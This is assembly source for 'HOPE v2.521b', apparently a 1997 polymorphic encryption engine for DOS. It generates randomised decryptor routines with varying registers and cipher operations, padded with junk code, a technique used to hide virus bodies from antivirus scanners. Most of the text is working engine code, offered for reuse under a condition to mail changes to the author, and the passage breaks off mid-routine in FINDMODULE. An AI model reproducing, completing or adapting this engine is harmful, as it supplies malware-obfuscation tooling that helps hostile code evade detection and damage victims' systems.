;==============================HOPE v2.521b==================================
;(c) 1nternal 1997
;Use of this source is limited by the requirement to mail any
;fixes/optimisations/changes to the original author.


;Compile with a86 +o
.model tiny
.Radix 16
.code
ASSUME CS:_TEXT,DS_TEXT

;=================================Modules===================================
Extrn JUNKSTART:NEAR
Extrn INITSTART:NEAR
Extrn COUNTSTART:NEAR
Extrn CRYPTSTART:NEAR
Extrn LOOPSTART:NEAR

PUBLIC RANDNUM
PUBLIC GENERATE
PUBLIC DECRYPTEND
PUBLIC FIXEDJUNK
PUBLIC CHOOSE_REG
PUBLIC INITREGS
PUBLIC RESTORETABLES
PUBLIC ENGINESIZE
PUBLIC REG_STOR
PUBLIC HOPE_END
PUBLIC HOPE_START
PUBLIC BYTEOFF

;================================Defines================================

MAXMODSIZE EQU 020   ;Actually the maximum module total size (including junk)
MAXLONGSIZE EQU 037  ;Size of modules not in the loop, (bigger)

_AX EQU 0
_CX EQU 1
_DX EQU 2
_BX EQU 3
_SP EQU 4
_BP EQU 5
_SI EQU 6
_DI EQU 7

_AH EQU 0
_CH EQU 1
_DH EQU 2
_BH EQU 3
_AL EQU 4
_CL EQU 5
_DL EQU 6
_BL EQU 7

MAKEHI MACRO
        OR CL,4 ;set bit 4
#EM
MAKELO MACRO
        AND CL,11111011xB ;clear bit 4
#EM
COMPL MACRO
        XOR CL,4
#EM

;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
HOPE_START:

;=============================Tables for Storage=============================
;----------------------------Registers in use--------------------------------

REG_STOR:

Counter: DB _SP
Pointer: DB _SP
Seed:    DB _SP
Spare1:  DB _SP     ;Always a general register
Spare2:  DB _SP
Spare3:  DB _SP
Spare4:  DB _SP
REG_STOR_END:
SPINDEX: DB _SP     ;Always an index register (sometimes equal to Pointer)

;Same as Spare4 if not Pointer reg, uses BX as 2nd last priority

;-----------------Replacement Table for Generation of complement engine------
;Max of 5 cryptors in an engine, stored as
;Crypt, offset
;First crypt uses last offset, last crypt uses first offset
       
CRYPT_ENGINE_T:
  DW $           ;Offset of last item in table
  DB 'P'        ;Padding to make a size 3 field
  DB 15 DUP 'T'

;--------------------------------Save/Restore Stack---------------------------

STACKSTART:
  DB ' [HOPE] '
  DB '2.521b  '
  DW 4 DUP 'SS' ;12 word items
RESAVSP:
  DW $       ;"Stack Pointer"


;---------------------------------Code Offset------------------------------
EDCODESTART:
  DW 'CC'        ;Used to initialise Pointer with code start

;---------------------------------Loop Offset------------------------------

EDLOOPSTART:
  DW 'LL'        ;Used to jump to loop start address

;-----------------------------------Replaced Byte--------------------------
;Stores offset and byte of byte replaced with RETF
BYTEOFF:
  DW ?
STOREBYTE:
  DB ?

;--------------------------------- Variables -------------------------------

CODESIZE:    DW ?          ;Used to store size of code to be encrypted
DECRYPTEND:  DW ?          ;Used to store Decryptor size
SSEGSAVE:    DW ?          ;Used when changing SS
DSEGSAVE:    DW ?

RANDGEN1:    DW ?
RANDGEN2:    DW ?        ;Random Numbers for codes
PREVMOD:     DW ?        ;Used to store previous used mod to prevent repeat

ENGINESIZE:  DW ?        ;Increased with each byte written
FLAG:        DB ?        ;Save/Shift/Addressable Flag Byte
FLAG2:       DB ?        ;Init/DS=CS/Index/Counter/Code multiplier flag

;====================================================================
;================Init registers to use===============================
;====================================================================
INITREGS:
      CALL RESTORETABLES
      MOV BX,_DI
      MOV CX,08
SEEREG:
      CMP CX,_BP      ;Actually we dont want SP(4), but it is reduced later
      JNE NOT4
      DEC CX
     NOT4:
      MOV SI,REG_STOR_END-1
      CALL RANDNUM
      SUB SI,DX ;SI contains Table entry
      MOV DX,CX ;DX contains Reg to use
      DEC DX    ;DX reduced becuase we want to use 0
     INSERTREG:             ;Insert the register into the table,
        CMP SI,REG_STOR-1   ;Making sure to use only a blank entry
        JNE OKTHEN
         MOV SI,REG_STOR_END-1
       OKTHEN:
        CMP b[SI],_SP
        JNE NOTOK
        MOV b[SI],DL
        JMP OUTER
       NOTOK:
        DEC SI
       JMP INSERTREG
        OUTER:
      LOOP SEEREG

;----------Init SPINDEX and Spare 4-----------------------------------

;SPINDEX is a spare index or the actual pointer itself.
;Search through spares 2-4 for SI or DI
;If not found, look for BX
;Swap Spare 4 with Spare holding index
;If DI,SI or BX not spare, then make SPINDEX = Pointer
;Can actually use Spare1, but can't be bothered with the overhead to
;check that spare4 is a general reg etc...cause it is xchanged

        MOV SI,OFFSET SPARE1
       SAGAN:
        MOV DL,[SI]
        CMP DL,_SI
        JGE SWAP            ;Gets SI or DI (greater or equal)
        INC SI
        CMP SI,REG_STOR_END
        JNE SAGAN

        MOV SI,OFFSET SPARE1
       SAGAN2:
        MOV DL,[SI]
        CMP DL,_BX
        JE SWAP
        INC SI
        CMP SI,REG_STOR_END
        JNE SAGAN2

        MOV SI,OFFSET Pointer

    SWAP:
        MOV DH,b[SI]
        MOV b[SPINDEX],DH
        CMP [Pointer],DH
        JE USINGPOINTER
        MOV DL,[Spare4]
        MOV [SI],DL
        MOV [Spare4],DH
      USINGPOINTER:


;-----------------Make Spare1 a general register-----------------------

        MOV SI,SPARE1
SPARE1GEN:
        CMP b[SI],_BX
        JG NOTGENERAL          ;If bigger than BX then isn't general
        MOV AL,[SPARE1]
        MOV AH,[SI]
        MOV [SI],AL
        MOV b[SPARE1],AH
        JMP XHGD SHORT
       NOTGENERAL:
        INC SI
        JMP SPARE1GEN
       XHGD:
	RET

;============================Register Functions============================
;--------------------------------------------------------------------------
;--------------------------------Choose Reg--------------------------------

CHOOSE_REG:
       MOV CH,CL
       AND CH,00000111xB ;Get reg into CH

       TEST CL,8     ;Test if address style bit set
       JZ NOADDRESS
         CMP CH,00000101xB  ;Special Function 1
         JNE CHECKNEXT
         MOV BX,3           ;Get random new register
         CALL RANDNUM
         MOV CH,DL          ;Change the register we want
         JMP NOADDRESS SHORT

        CHECKNEXT:

         CMP CH,00000110xB  ;Special Function 2
         JNE NOTSPECIAL
         MOV BX,3           ;Get random new register
         CALL RANDNUM
         MOV CH,DL          ;Change the register we want
         OR b[FLAG],1       ;Set flag to really save
         JMP NOADDRESS SHORT

        NOTSPECIAL:
         OR b[FLAG],4 ;Set flag to convert to addressable
      NOADDRESS:

      TEST CL,010    ;Test R/M bit set
      JZ NOTSHIFT    ;if not set, then we don't shift to bits 3-5
                      ;if set, shift to Regfield in ModR/M
       OR b[FLAG],2   ;Set flag to shift bits
      NOTSHIFT:

        XCHG CL,CH
        XOR CH,CH
        MOV SI,OFFSET REG_STOR
        ADD SI,CX
        MOV CL,b[SI]

        TEST b[FLAG],4
        JZ CLEARFLAG

       NOSPECIAL:
        CMP CL,_BX
        JNE CHECKFORSI
        MOV CL,07           ;Convert BX to [BX]
        JMP CLEARFLAG SHORT

       CHECKFORSI:
        CMP CL,_SI
        JL CLEARFLAG
        DEC CL              ;Convert SI or DI to [SI] or [DI]
        DEC CL
       CLEARFLAG:
        AND b[FLAG],11111011xB   ;Clear flag to style address
        JMP CHECKSAVE

;--------------------------------------------------------------------------
;----------------------------------Random Reg------------------------------

CHOOSE_RAND:
       XOR CH,CH      ;Not needed

       TEST CL,08     ;Test if save bit set
       JZ NOSAVE
       OR b[FLAG],1   ;Set flag to save register
      NOSAVE:
       TEST CL,010    ;Test R/M bit set
       JZ DONTSHIFT  ;if not set, then we don't shift to bits 3-5
                     ;if set, shift to Regfiled in ModR/M
       OR b[FLAG],02   ;Set flag to shift bits
      DONTSHIFT:
       AND CL,00000111xB ;Clear Save bit of reg, plus other bits
       INC CX
;--------------------       
       RREG0:
       LOOP RREG1     ;Any General Register
         MOV BX,04
         CALL RANDNUM        ;Returns a number between 0-3
         MOV CL,DL
         JMP CHECKSAVE
;--------------------
       RREG1:         ;Any Spare General Register ('cept SPINDEX)
       LOOP RREG2
         
        REDO:
         MOV SI,OFFSET SPARE1
         MOV BX,04
         CALL RANDNUM          ;Number between 0-3
         ADD SI,DX
        COMPARE:
         MOV CL,b[SI]
         CMP CL,_BX            ;Anything bigger than BX isn't general
         JG NOTGEN
          CMP CL,[SPINDEX]
          JE REDO
          
          JMP CHECKSAVE
        NOTGEN:
         JMP REDO

;----------------------
       RREG2:          ;Any Spare register
        LOOP RREG3

       GETANOTHER:     
        MOV BX,04      ;The spare4 doesn't always contain SPINDEX
        MOV SI,OFFSET SPARE1     
        CALL RANDNUM
        ADD SI,DX
        MOV CL,b[SI]
        CMP b[SPINDEX],CL
        JE GETANOTHER         ;Get another if SPINDEX reg (if spare 4 chosen
        
        JMP CHECKSAVE                   
;-----------------------
       RREG3:                ;Any Spare register+Seed
        LOOP RREG4           
          
      GETANOTHER2:           

          MOV SI,OFFSET Seed
          MOV BX,05          ;The spare4 doesn't always contain SPINDEX
          CALL RANDNUM       ;Returns 0-4
          ADD SI,DX
          MOV CL,b[SI]
          CMP b[SPINDEX],CL
          JE GETANOTHER2        ;Get another if SPINDEX reg (if spare 4 chosen
          
          JMP CHECKSAVE         ; and spare4 = SPINDEX)
;-----------------------------
       RREG4:           ;Get any register (except SP)
        LOOP RREG5      ;Just uses the reg table to avoid getting SP
         RETRY:
          
          MOV SI,OFFSET COUNTER
          MOV BX,07
          CALL RANDNUM       ;Returns 0-6
          ADD SI,DX
          MOV CL,[SI]
          
          JMP CHECKSAVE
;------------------------------
       RREG5:
        LOOP RREG6     ;Restore as Low
         CALL RESTOREWORD     ;Restored Word into CX
         MAKEHI               ;Make CL HI
         JMP CHECKSAVE
;-------------------------------
       RREG6:
        LOOP RREG7       ;Restore as HI
         CALL RESTOREWORD
         MAKELO
         JMP CHECKSAVE
;-------------------------------
       RREG7:
         CALL RESTOREWORD     ;Simply restore into CX (CL contains Reg)

       CHECKSAVE:             ;Checks if we are to save CX
        TEST b[FLAG],01
        JZ DONTSAVE
        CALL SAVEWORD         ;Save CX to Save/Restore Stack, Saves new CL
       DONTSAVE:
        TEST b[FLAG],02
        JZ NOSHIFT
        SHL CL,03              ;If set, shift reg bits up 3
       NOSHIFT:
        AND b[FLAG],11111100xB   ;Clear Flags
        RET

;----------------------------------------------------------------------------
;-------------------------------Byte Register Code---------------------------
CHOOSE_BYTE:

        XOR CH,CH           ;Not needed

        TEST CL,010         ;Check R/M bit of code
        JZ BITS02
        OR b[FLAG],2        ;Set flag to shift reg
       BITS02:
        AND CL,00001111xB  ;Clear some flags in code

        TEST CL,04           ;Test if save bit set
        JZ NOTSET
        OR b[FLAG],1         ;Set flag to save CX at end
       NOTSET:
        AND CL,00001011xB   ;Clear Save bit of CL, plus other bits

        TEST CL,08          ;0 = make Hi, 1 = random H/L
        JZ HBYTEHCHOOSE     ;If 0 then is HI code
        AND CL,00000011xB  ;Clear all flags
        JMP PARSERAND      ;Else is RandomH/L code
      HBYTEHCHOOSE:
        AND CL,00000011xB  ;Clear all flags

;---------------------------------Parse Byte as HI-------------------------
PARSEHI:
;--------------------------------
       CMP CL,1            ;Save some code if it is one of the first 2 funcs
       JG NOTGENCHOOSE
                            ;CL contains code already for RAND_CHOOSE
        PUSH [OFFSET FLAG]
        MOV b[FLAG],0       ;Clear flag byte
        CALL CHOOSE_RAND    ;Use any general register/any spare general
        POP [OFFSET FLAG]
        MAKEHI              ;Make it Hi baby
        JMP CHECKSAVE

;--------------------------------
      NOTGENCHOOSE:        ;Otherwise check for other functions
        CMP CL,2           ;Check if 'tricky' func
        JNE RESTORECOMPL
        TEST b[FLAG],01      ;See if flag to save set
        JZ SPAREREG        ;If not set then is spare1 reg we want
        MOV CX,02          ;Seed REG
        CALL SAVEANDCHOOSE
        JMP GOTIT
       SPAREREG:
        MOV CX,03          ;Spare1 REG
        CALL SAVEANDCHOOSE
       GOTIT:
        MAKEHI
        JMP DONTSAVE      ;Clear save flag and return
;------------------------------
     RESTORECOMPL:
        CALL RESTOREWORD  ;Restore Word (reg)
        COMPL             ;Complement it
        JMP CHECKSAVE     ;Check if we are to save it

;-------------------------------Parse RandomH/L---------------------------

PARSERAND:
        CMP CL,1
        JG NOTGESP  ;Check if General or Spare General code
                    ;CL already contains code for General/spare general
	PUSH [OFFSET FLAG]
        MOV b[FLAG],0
        CALL CHOOSE_RAND    ;Use any general register/any spare general
        POP [OFFSET FLAG]

	CALL RANDHL    ;Make RandomH/L
        JMP CHECKSAVE

       NOTGESP:     ;RandomH/L of spare1 or Seed
        CMP CL,02
        JNE GENSEED
        MOV CX,03    ;For Spare1 register
        CALL SAVEANDCHOOSE
        CALL RANDHL
        JMP CHECKSAVE
       GENSEED:

        MOV CX,02    ;For General Seed register
        CALL SAVEANDCHOOSE
        CALL RANDHL
        JMP CHECKSAVE

                               
;============================ Value Insertion =============================
;AL = Byte to write
;ES:DI = place to write it
;DS:SI = offset of code in header
;CL = code
;CH = offset from 1st machine (current machine - 1st machine)
;DX offset of first machine code in module (CS)

CHOOSE_VALUE:
         

        TEST CL,00001000xB   ;Test for random/fixed value code
        JZ RANDVALS         ;ZF=1 if not set
      FIXEDVALS:
        
        TEST CL,00000001xB   ;Check for CodeSize/Offset type code
        JZ OFFSETYPE
        TEST CL,00000010xB   ;Check Codesize multiplier
        JZ CODETIMES1
                          ;Put in code size * 1
        CODETIMES2:
         MOV DX,[CODESIZE]
         JMP WRITEVAL
        CODETIMES1:
         MOV DX,[CODESIZE] ;Put code size * 1/2
         SHR DX,1

         JMP WRITEVAL

        OFFSETYPE:
         TEST CL,00000010xB
         JZ CODEOFF

         LOOPOFF:
          
          MOV DX,DI
          INC DX             ;So points to next instruction
          SUB DX,[EDLOOPSTART]
          NEG DX
          TEST CL,00010000xB ;Test if 16 bit
          JZ WRITEBYTE       ;Write 8 bit number if 0 (should always be if loop)
          JMP WRITEVAL

         CODEOFF:
          MOV w[EDCODESTART],DI
          JMP NOWRITE

      RANDVALS:
          TEST CL,00000001xB    ;Test for generation?
          JZ LINETYPE
        GENTYPE:
          TEST CL,00000010xB    ;Test gen1 or gen2
          JZ GEN1
         GEN2:
           MOV DX,[RANDGEN2]
           TEST CL,00010000xB    ;Test 16 or 8bit
           JZ WRITEBYTE
           JMP WRITEVAL
         GEN1:
           MOV DX,[RANDGEN1]
           TEST CL,00010000xB    ;Test 16 or 8bit
           JZ WRITEBYTE
           JMP WRITEVAL
         LINETYPE:
          MOV BX,0FFFE
	  CALL RANDNUM
          TEST CL,00010000xB    ;Test 16 or 8bit
          JZ WRITEBYTE

      WRITEVAL:
        DEC DI
        ES MOV b[DI],DL
        INC DI
        MOV AL,DH
        JMP NOWRITE
      WRITEBYTE:
        MOV AL,DL          ;Don't modify other byte, just current
      NOWRITE:
        XOR CX,CX          ;Make no change to byte written
    RET

;============================Offset Relocation============================
;Code in CL
;Offset in machine code from 1st machine code in CH
;Engine place in ES:DI
;Place of header code in DS:SI
;Unwritten byte in AL
;DX offset of first machine code in ES

CHOOSE_OFFSET:
       
        XOR CH,CH
        TEST CL,00000010xB        ;Test if absolute type offset first
        JNZ ADDLEAVE              ;If is, simply add DI and leave

    AFFECTED:
        TEST CL,00000100xB        ;Test if positive offset
        JNZ DONOTHING             ;If is, then do nothing, is adjusted by RSJ

      ;We now have a 16 or 8 bit negative offset affected by RS Junk
      ;Check parent headers for RSJUNK insert. On finding one, add difference
      ;between Offset for RSJ and current Offset

      ;NOTE: There should be no negative non-affected, non-absolute offsets

        TEST CL, 00001000xB       ;Test if not affected
        JZ NOTAFFECTED

        PUSH AX

        GETPREV:
          OR SI,SI
          JZ DOPOP
          DEC SI
          DEC SI
          MOV AX,[BX+SI]       ;Load Header code
          AND AL,11101111xB    ;Get rid of regardless bits
          CMP AL,10000000xB    ;Check if RSJUNK insert
          JNE GETPREV

        XOR AL,AL
        XCHG AL,AH           ;Get offset of RSJ into AX
        ADD AX,DX            ;Add offset of 1st machine code in ES
                             ;AX contains offset of RSJ
        MOV BP,DI            ;BP contains offset of offset
        DEC BP
        SUB BP,AX            ;BP contains difference between the two (neg)

        POP AX               ;Restore AX (orignal byte in AL)

        TEST CL,00010000xB   ;Check if 16 bit
        JZ BYTEOFFS

        DEC DI
        XCHG AH,AL
        ES MOV AL,b[DI]       ;Load other byte of offset
        SUB AX,BP             ;Calc new offset
        XCHG AH,AL
        ES MOV b[DI],AH       ;Write new byte
        INC DI                ;High part of word is in AL to be written
        JMP DONOTHING

      BYTEOFFS:
        XOR AH,AH
        MOV CX,BP
        SUB AL,CL              ;AL contains new byte
        JMP DONOTHING

      NOTAFFECTED:             ;Negative non-affected offset

        INT 3                  ;Shouldn't use

      ADDLEAVE:

        ;JMPED to if DI needs to be added to offset

        DEC DI
        XCHG AH,AL             ;Swap bytes because of x86 storing order
        ES MOV AL,b[DI]        ;Load other byte of offset
        ADD AX,DI              ;offset value + (DI-1)
        INC AX                 ;Increase so = + DI
        XCHG AH,AL
        ES MOV b[DI],AH        ;Write top byte, and leave AL(H) to be written
        INC DI

        TEST CL,00001000xB
        JNZ AFFECTED

        JMP DONOTHING

      DOPOP:
        POP AX
      DONOTHING:
        XOR CL,CL              ;Make no modification to AL to write
RET

;========================= Misc Opcode ===================================
;Max RS insertion in BP
;Code in CL
;Offset in machine code from 1st machine code in CH
;Engine place in ES:DI
;Place of header code in DS:SI
;Unwritten byte in AL

CHOOSE_OPCODE:

        
	TEST CL,00010000xB ;Check for Crypt bit
        JNZ OTHERBIT       ;0=crypt , 1=opcode/restore

   CRYPTBIT:
        TEST CL,00001000xB  ;Check crypt type
        JZ INCDECTYPE       ;1=Arith, 0= INC/DEC/NEG/NOT

      ARITHTYPE:
        TEST CL,00000010xB  ;Test for 'anytype' of encryption
        JZ LIMITED

      ANYTYPE:
        MOV BX,08
        CALL RANDNUM
        SHL DX,3
        JMP CHECKSAVEBIT

      LIMITED:
        MOV BX,3            ;BX=3
        CALL RANDNUM        ;DX = 0-2
        SHL DL,3            ;Move bits 0-2 to bits 3-5
        OR DX,DX            ;ADD = 000, SUB = 101, XOR = 111 or'd on bits 3-5
        JZ CHECKSAVEBIT
       ADD4:
        OR DL,00100000xB    ;Add 4 over OR,ADC,SBB,AND
        JMP CHECKSAVEBIT

      INCDECTYPE:
        MOV BX,4
        CALL RANDNUM        ;DX is returned with 0,1,2 or 3
	SHL DL,3
    	TEST DL,00010000xB  ;Check if NEG/NOT
	JZ DECINCTYPE	    ;Change previous byte (Opcode)
	ES AND b[DI-1],11110111xB ;Make F7 type opcode
	JMP ANDGOBACK SHORT
       DECINCTYPE:
	ES OR b[DI-1],00001000xB ;Make FF type opcode
       ANDGOBACK:
	OR DL,01000000xB    ;Flag of DEC/INC/NEG/NOT


      CHECKSAVEBIT:

        TEST CL,00000001xB  ;Test if we are to save compl to stack
        JZ NOSAVECOMPL
        PUSH CX
        MOV CX,DX           ;cause calls with CL
        CALL FINDCOMPLCRYPT ;Calls with CL, returns in CL
        CALL SAVEWORD       ;Save CX to alt stack
        POP CX

       NOSAVECOMPL:

        TEST CL,000000100xB  ;Test if we are to save to table
        JZ FINISHED         ;1=save, 0=nosave


        ADD w[CRYPT_ENGINE_T],3 ;Add to offset of last item
        MOV SI,[CRYPT_ENGINE_T] ;Load in location to store table entry
        MOV CL,DL               ;Load crypt value into CL
        CALL FINDCOMPLCRYPT     ;Load complement cryptor into CL
        MOV b[SI],CL            ;Save in compl crypt value (currently in CL)
        MOV w[SI+1],DI          ;Save in offset of crypt to table
        JMP FINISHED            ;Return

   OTHERBIT:      ;Reversible Opcode/Restore Crypt value

          TEST CL,00001000xB ;Test opcode adjust type
          JNZ OPCODEADJ      ; 0 =restore , 1=opcode adjust

       RESTORECRYPT:
           
           TEST CL,00000001xB ;Test if we are to save again
           JZ NOKEEP
           CALL RESTOREWORD
           CALL SAVEWORD
           JMP SVRETURN SHORT
          NOKEEP:
           CALL RESTOREWORD
          SVRETURN:
           TEST CL,01000000xB ;Test for INC/DEC/NEG/NOT Flag
   	   JZ NOFLAG
	   TEST CL,00010000xB ;Test for NEG/NOT
	   JZ NOTNEGNOT
	   ES AND b[DI-1],11110111xB
	   JMP NOFLAG SHORT
	   NOTNEGNOT:
	   ES OR b[DI-1],11111111xB
	  NOFLAG: 
	   RET

       OPCODEADJ:

           TEST CL,00000001xB
	   JZ MODRMOP
	
	INCDECBYTE:   
	
	   MOV BX,02
	   CALL RANDNUM
	   SHL DL,3
	   MOV CL,DL      	;Simply choose 0 or 1 to make INC or DEC
	   RET	
	
	MODRMOP:

           TEST b[RANDGEN1], 01000000xB ;Used to determine if we swap the ops
           JZ CLEARCX   ;If we don't reverse there is no need to change opcode
           
        REVERSE:

           MOV DL,AL
           MOV DH,AL
           AND DL,00111000xB  ;Just leave Hi 3 bits
           AND DH,00000111xB  ;Just Leave Lo 3 bits
           SHR DL,3
           SHL DH,3
           AND AL,11000000xB  ;Just leave Hi 2 bits
           OR AL,DH
           OR AL,DL           ;Put in fields

        NOREVERSE:

           TEST CL,00000100xB ;Make change to opcode?
           JZ CLEARCX
           ES XOR b[DI-1],00000010xB ;Reverse reg/mem bit of opcode
         CLEARCX:
           XOR CX,CX
           RET

   FINISHED:
        AND DL,00111000xB   ;Get rid of irrel bits in cryptor
        MOV CL,DL           ;CL = change to make to AL (OR'd on)
RET

;======================Junk Insertion======================================
;Max RS insertion in BP

CHOOSE_JUNK:
        PUSH AX
        PUSH BP
        MOV AL,CL
        AND AL,00001111xB    ;Check RS size
        JZ RSJUNKTYPE
        XOR AH,AH
        MOV BP,AX            ;Load Fixed size into BP
        CALL FIXEDJUNK
        JMP FIXEDTYPE
       RSJUNKTYPE:
        CALL RSJUNK
       FIXEDTYPE:
        XOR CL,CL            ;Make no modification to byte to write
        POP BP
        POP AX
        RET

FIXEDJUNK:
;Checks whether we want code or real junk
;Calls with BP
;Calls Load junk with BP as max size
;Keeps calling until BP is reduced to zero

        TEST CL,010       ;Test for Code=1, Numbers=0
        JZ NUMBERJUNK     ;ZF=1 if not set

        CODEJUNK:
         CALL LOADJUNK    ;BP contains max size
         OR BP,BP
         JNZ CODEJUNK     ;Keep going using smaller & smaller BP
        RET

        NUMBERJUNK:
         MOV CX,BP
        REINSERT:
         MOV BX,0FF
         CALL RANDNUM
         MOV AL,DL
         STOSB             ;DI is changed on return
         INC W[ENGINESIZE]
         LOOP REINSERT
        RET

RSJUNK:
;Max in BP
;Check up module header for + offset affected, using DS:SI
;Until reaches one or reaches BX
;Offset of current machine code in DX (offset of AL)
;BX+SI = offset of Code

               ;CL contains code
               ;CH contains 8 bit offset for code
               ;AL contains Byte
               ;DI contains insertion point
               ;ES contans segment for insertion
               ;DS contains segment of module
               ;BP contains MAX RS size (for junk insertion)
               ;BX contains offset of 1st header code
               ;SI contains offset from BX of header code
               ;DX contains Offset of first machine byte

        PUSH DI          ;+++++
        
        OR BP,BP
        JZ NOFIXED       ;To avoid Div/0

        PUSH CX          
        PUSH BX          
        MOV BX,BP
        CALL RANDNUM
        MOV BP,DX
        INC BP
        CALL FIXEDJUNK   ;Code Or number junk
        POP BX
        POP CX           ;Restore Old CX

      NOFIXED:

          POP BP        ;+++++ Old DI into BP

         CHECKAGAIN:
           OR SI,SI
           JZ ZEROINS          ;At the start of the header

           DEC SI
           DEC SI              ;Parent Code&Offset in header
           
           MOV AX,w[BX+SI]
           AND AL,11101111xB
           CMP AL,10000000xB
           JE ZEROINS          ;If we encounter an RS then don't adjust

           MOV AX,w[BX+SI]
           AND AL,11101100xB   ;Check for affected + offset
           CMP AL,01101100xB   ;Check code = to positve, affected, offset 
           JNE CHECKAGAIN
                              ;Found a positve offset
           CMP AH,CH          ;Check if offset is less
           JG CHECKAGAIN      ;It should be less

          ;-----------------------------------
           ;NB: An RS Insert which moves the offset will cause unpredictable
           ;results.

           MOV AL,CH
           SUB AL,AH           ;AL contains difference between 2 offsets
           XOR AH,AH

           PUSH BP
           SUB BP,AX           ;Offset of 'offset' in ES
           MOV AX,w[BX+SI]     ;Load Code&Offset again into AX
           MOV SI,BP           ;SI contains offset in ES
           POP BP
                               
           MOV DX,DI           ;BP = Old DI before RSJI
           SUB DX,BP           ;DX = Junk Size Increase

           TEST AL,010         ;Test offset code for 16 or 8 bit
          JZ EIGHTBIT          ;ZF=1 if not set (8 bit)

          WORDTYPE:
           DEC SI              ;Decrease SI so point to whole word
           ES CMP BP,W[SI]     ;Check if offset points past old DI
           JLE WRONGBIT        ;If less, then don't worry
           ES ADD w[SI],DX     ;Increase offset (Word)
           JMP WRONGBIT

          EIGHTBIT:
           XOR CH,CH           ;SI = offset of offset in ES
           ES MOV CL,b[SI]     ;CL = current value of offset
           ADD CX,DX           ;BP = old DI
           ADD CX,SI
           CMP CX,BP           ;Offset must point past old DI to be acceptable
           JL WRONGBIT
           ES ADD b[SI],DL     ;Increase offset (byte)

          WRONGBIT:
           
         ;------------------------------
          ZEROINS:

       RET


;==============================END PARSED CODES=============================

;==============================General Functions============================


;------------------------Save Flag and Call CHOOSE REG---------------------
SAVEANDCHOOSE:
        MOV BX,W[FLAG]
        MOV b[FLAG],0
        CALL CHOOSE_REG
        MOV b[FLAG],BX
        RET

;----------------------Random number generator ----------------------------
;Highest passed in BX, returned in DX
RANDNUM:
        PUSH AX
         IN AX,040
         MOV DX,AX
       RANDSEED:
         XOR AX, 067C5       ;Value will be changed by next instructions
         XOR DX,AX
         MOV AH,DL
         XOR [RANDSEED+1],AX
         ADD [RANDSEED+1],AL
        XOR DX,DX
        DIV BX  ;Remainder in dx
        POP AX
        RET
;-------------------------Find Complement Crypt Operation------------------
FINDCOMPLCRYPT:
        CMP CL,00110000xB       ;If XOR
        JE GOTVAL               ;Just keep XOR
        CMP CL,01010000xB	;If NOT
	JE GOTVAL		;Just keep NOT
	CMP CL,01011000xB	;If NEG
	JE GOTVAL		;Just keep NEG
	OR CL,CL                ;IF ADD (0)
        JNZ NEXT1
        MOV CL,00101000xB       ;Return SUB
        JMP GOTVAL SHORT
       NEXT1:
        CMP CL,00101000xB       ;IF SUB
        JNE NEXT2
        MOV CL,00000000xB       ;Return ADD
        JMP GOTVAL SHORT
       NEXT2:
        CMP CL,01000000xB       ;IF INC
        JNE NEXT3
        MOV CL,01001000xB       ;Return DEC
        JMP GOTVAL SHORT
       NEXT3:
	MOV CL,01000000xB       ;Return INC, (must be DEC)
       GOTVAL:
        RET

;--------------------Rand toggle bit 4 of CL ------------------------------

RANDHL:
        MOV BX,02
        CALL RANDNUM
        SHL DL,02
        XOR CL,DL      ;Toggle bit 2 making it 0/1 randomly
        RET            ;Used to toggle H/L of a reg

;------------------------------Restore Word-----------------------------
RESTOREWORD:        
        CLI                 ;Clear interrupts when working with SS/SP
        
        MOV [SSEGSAVE],SS    ;Save SS
        PUSH DS
        POP SS              ;Set SS to DS
        MOV BX,SP
        MOV SP,[RESAVSP]    ;Get new stack pointer
        POP CX              ;POP value from alt stack
        JMP BACKSTACK
;------------------------------Word Save--------------------------------
SAVEWORD:
        CLI
        
        MOV [SSEGSAVE],SS    ;Save SS
        PUSH DS
        POP SS              ;Set SS to DS
        MOV BX,SP           ;Save old stack pointer
        MOV SP,[RESAVSP]    ;Get new stack pointer
        PUSH CX             ;Push value to alt stack
BACKSTACK:
        MOV [RESAVSP],SP    ;Save new Stack Pointer to mem
        MOV SP,BX           ;Restore old stack pointer
        MOV SS,[SSEGSAVE]    ;Restore SS
        STI                 ;Restore interrupt flag
        RET

;========================== END GENERAL FUNCTIONS ========================


;==========================================================================
;=========================== Gen Mod Header Check =========================
;CL is Header byte
;Returns CL==0 if OK
;BP max junk insertion size
;returns if success BP  == Code size for each RS

CHECKGENMOD:
        TEST CL,10000000xB     ;Requires CX is counter?
        JZ NOTCXSET     ;ZF=1 if zero
        CMP b[Counter],1 ;Check if count=CX
	JNE NOGOOD
	AND CL,01111111xB ;Clear CX is count bit
       
       NOTCXSET:
	TEST CL,01000000xB ;Requires an index as pointer?
	JZ NOTINDEXSET
        CMP b[Pointer],3         ;Is it BX?
       	JNE NOTBX
       	AND CL,10111111xB ;Clear pointer is index bit
       	JMP NOTINDEXSET
       NOTBX:
        CMP b[Pointer],6         ;Is it SI?
       	JNE NOTSI
       	AND CL,10111111xB ;Clear pointer is index bit
       	JMP NOTINDEXSET
       NOTSI:
        CMP b[Pointer],7         ;Is it DI?
       	JNE NOGOOD
       	AND CL,10111111xB ;Clear pointer is index bit       
       NOTINDEXSET:
	TEST CL,00100000xB ;Requires seed is general?
        JZ NOTSEEDGEN
        CMP b[Seed],3
        JG NOGOOD
       	AND CL,11011111xB ;Clear seed as general bit
       
       NOTSEEDGEN:
       	TEST CL,00010000xB ;Requires AX is spare1?
        JZ NOTAXSPARE
        CMP b[Spare1],0
	JNE NOGOOD
        AND CL,11101111xB ;Clear AX as spare1
       
       NOTAXSPARE:
        TEST CL,00001000xB ;Requires DS=CS?
        JZ NOTDSASCS
        TEST b[FLAG2],01000000xB ;Test if DS has been flagged as CS by init
        JZ NOGOOD
        AND CL,11110111xB ;Clear DS=CS flag
       NOTDSASCS:

        ;High 5 bits should be 0 at here
        
        MOV AX,BP
        XOR BP,BP       ;Make insertion size 0
        OR CL,CL        ;Check number of insertions
        JE NOGOOD       ;Insertion size = 0 if no insertions
                        ;It is actually "good"
        DIV CL          ;Get size for each insertion so it doesn't diminish
        XOR AH,AH       ;AH = Rem, AL = Quo
        MOV BP,AX       ;BP == Max insertion size
        AND CL,11110000xB
       NOGOOD:
        RET		;Return with CL either 0 or some other value


;=============================Find Module==================================
;Searches for module in size less than BP
;Returns Module header offset in SI
;Size for each RS insertion in BP

FINDMODULE:
        MOV BX,040
        CALL RANDNUM
        MOV CX,DX

       GOTHROUGH:
        MOV SI,[SI]         ;Scan through linked list
        LOOP GOTHROUGH
        
       CHOOSEAGAIN:
        
        MOV SI,[SI]         ;Move to next module
